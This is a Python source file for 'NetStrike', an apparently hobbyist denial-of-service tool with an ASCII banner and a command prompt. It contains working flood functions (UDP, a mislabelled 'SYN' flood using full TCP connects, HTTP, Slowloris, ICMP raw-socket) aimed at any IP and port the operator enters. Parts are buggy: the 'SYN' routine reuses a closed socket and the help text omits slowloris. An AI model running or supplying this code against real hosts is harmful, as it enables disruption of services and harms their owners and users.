import threading
import socket
import random
import time
import os


def udp_flood(target_ip, target_port, duration):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    duration = time.time() + duration
    packets_sent = 0
    try:
        while True:
            if time.time() > duration:
                break
            else:
                bytes = random._urandom(1024)
                udp_socket.sendto(bytes, (target_ip, target_port))
                packets_sent += 1
                print(
                    f"Sent UDP packet to {target_ip}:{target_port} [Total packets sent: {packets_sent}]"
                )
    except KeyboardInterrupt:
        print("Attack stopped by user (CTRL + C)")
    
    udp_socket.close()


def syn_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    duration = time.time() + duration
    packets_sent = 0
    try:
        while True:
            if time.time() > duration:
                break
            else:
                sock.connect((target_ip, target_port))
                sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
                sock.sendto(
                    b"Host: " + target_ip.encode() + b"\r\n\r\n", (target_ip, target_port)
                )
                sock.close()
                packets_sent += 1
                print(
                    f"Sent SYN packet to {target_ip}:{target_port} [Total packets sent: {packets_sent}]"
                )
    except KeyboardInterrupt:
        print("Attack stopped by user (CTRL + C)")


def http_flood(target_ip, target_port, duration):
    headers = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n"
    duration = time.time() + duration
    packets_sent = 0
    try:
        while True:
            if time.time() > duration:
                break
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.sendall(headers.encode())
                sock.close()
                packets_sent += 1
                print(
                    f"Sent HTTP packet to {target_ip}:{target_port} [Total packets sent: {packets_sent}]"
                )
    except KeyboardInterrupt:
        print("Attack stopped by user (CTRL + C)")


def slowloris(target_ip, target_port, duration):
    headers = (
        "GET / HTTP/1.1\r\nHost: "
        + target_ip
        + "\r\n"
        + "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        + "\r\n"
        + "Connection: keep-alive"
        + "\r\n"
    )
    duration = time.time() + duration
    packets_sent = 0
    try:
        while True:
            if time.time() > duration:
                break
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                sock.sendall(headers.encode())
                time.sleep(15)
                packets_sent += 1
                print(
                    f"Sent Slowloris packet to {target_ip}:{target_port} [Total packets sent: {packets_sent}]"
                )
    except KeyboardInterrupt:
        print("Attack stopped by user (CTRL + C)")


def icmp_flood(target_ip, duration):
    duration = time.time() + duration
    packets_sent = 0
    try:
        while True:
            if time.time() > duration:
                break
            else:
                packet = random._urandom(1024)
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.sendto(packet, (target_ip, 0))
                sock.close()
                packets_sent += 1
                print(
                    f"Sent ICMP packet to {target_ip} [Total packets sent: {packets_sent}]"
                )
    except KeyboardInterrupt:
        print("Attack stopped by user (CTRL + C)")


plane = """\033[32m
 _____         ______
| : \         |    \\ 
| :  `\\______|______\\_______
 \\'______   NetStrike  \\_____\\_____
   \\____/-)_,---------,_____________>--
             \\       /
              |     /
              |____/__
\033[0m"""

commands = """
\t\t udp  <ip> <port> <duration>
\t\t syn  <ip> <port> <duration>
\t\t http <ip> <port> <duration>
\t\t icmp <ip> <duration>
"""


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def main():
    # Print plane
    for _ in range(50):
        for line in plane.split("\n"):
            print(" " * (_ % (1000 * len(plane.split("\n")[0]))) + line)
        time.sleep(0.05)
        clear()

    while True:
        print(commands)
        cmd = input(f"NetStrike$ ").split()

        if cmd[0] == "udp":
            udp_flood(cmd[1], int(cmd[2]), int(cmd[3]))
        elif cmd[0] == "syn":
            syn_flood(cmd[1], int(cmd[2]), int(cmd[3]))
        elif cmd[0] == "http":
            http_flood(cmd[1], int(cmd[2]), int(cmd[3]))
        elif cmd[0] == "slowloris":
            slowloris(cmd[1], int(cmd[2]), int(cmd[3]))
        elif cmd[0] == "icmp":
            icmp_flood(cmd[1], int(cmd[2]))
        else:
            print("Invalid command!")


if __name__ == "__main__":
    main()